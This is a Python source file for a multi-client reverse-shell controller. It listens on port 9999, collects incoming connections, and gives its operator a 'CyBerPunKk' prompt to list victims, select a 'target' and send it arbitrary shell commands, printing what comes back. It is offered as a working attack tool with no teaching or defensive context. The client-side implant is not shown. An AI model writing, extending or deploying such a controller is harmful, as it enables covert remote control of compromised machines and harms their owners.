import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []



# Creating the Socket( allows two computers to connect )
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as e:
        print("Socket Creation error: " + str(e))


# Binding socket to port and wait for connection from the client
def bind_socket():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5) # allow server to accept incoming connections
    except socket.error as e:
        print("Socket Binding Error : " + str(e))
        time.sleep(5)
        bind_socket()


# Accept a connection from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(addr)
            print("\nConnection has been Established : " + addr[0])
        except:
            print("Error accepting connections .")

   
# Interactive prompt for sending commands remotely
def start_CyBerPunKk():
    while True:
        cmd = input('CyBerPunKk =>>')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")


# Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            # sending a blank msg to ensure that we are connected.
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('----------------- Clients -----------------' + '\n' + results)


# Select a target client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to "+ str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + "=>>", end="")
        return conn
    except:
        print("Not a Valid selection")
        return None


# connect with remote target Client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == "quit":
                break
        except:
            print("Connection was lost")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # to quit the script when the program quits.
        t.start()


# Do the next job in the queue (first handles connections, second sends commans)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if x == 2:
            start_CyBerPunKk()
        queue.task_done()



# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
